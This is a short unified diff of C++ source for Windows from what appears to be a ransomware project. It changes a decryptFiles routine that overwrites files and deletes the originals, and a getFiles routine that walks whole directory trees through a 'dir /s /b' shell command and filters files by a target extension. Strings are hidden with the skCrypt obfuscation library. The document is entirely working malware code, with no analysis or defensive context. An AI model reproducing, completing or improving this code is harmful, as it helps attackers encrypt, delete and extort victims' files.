@@ -77,9 +77,8 @@ void decryptFiles(vector<string> files, string key) {
         fout.write((const char*)&content[0], content.size());
         fout.close();
 
-        if (newFileName != CHECKSUM_FILE)
-            if (remove(file.c_str()) != 0)
-                DeleteFileA(file.c_str());
+        if (remove(file.c_str()) != 0)
+            DeleteFileA(file.c_str());
     }
 }
 
@@ -133,7 +132,8 @@ vector<string> getFiles(string mainDir) {
     if (DEBUG && !PathIsDirectoryEmptyA((LPCSTR)mainDir.c_str())) {
         vector<string> files = split(exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
         for (string file : files)
-            result.push_back(file);
+            if ((string)skCrypt(".") + split(file, '.').back() == FILE_EXTENSION)
+                result.push_back(file);
     }
 
     else {
@@ -151,6 +151,6 @@ vector<string> getFiles(string mainDir) {
 
         result.insert(result.end(), globalAllFiles.begin(), globalAllFiles.end());
     }
-    result.pop_back();
+
     return result;
 }
